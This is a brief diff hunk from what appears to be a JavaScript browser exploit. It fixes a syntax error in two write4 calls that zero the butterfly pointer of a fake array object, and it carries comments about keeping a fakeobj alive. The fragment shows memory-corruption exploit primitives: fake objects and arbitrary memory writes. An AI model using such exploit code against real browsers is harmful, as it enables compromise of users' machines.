@@ -236,8 +236,8 @@ function go_() {
 				fakeobj['a'] = 1; // Make _SURE_ fakeobj stays alive until this point
 
 				// Set the butterfly pointer of the fake array to nullptr
-				write4((bufs[i][k] + 0x08, 0);
-				write4((bufs[i][k] + 0x0C, 0);
+				write4(bufs[i][k] + 0x08, 0);
+				write4(bufs[i][k] + 0x0C, 0);
 				
 				
 				
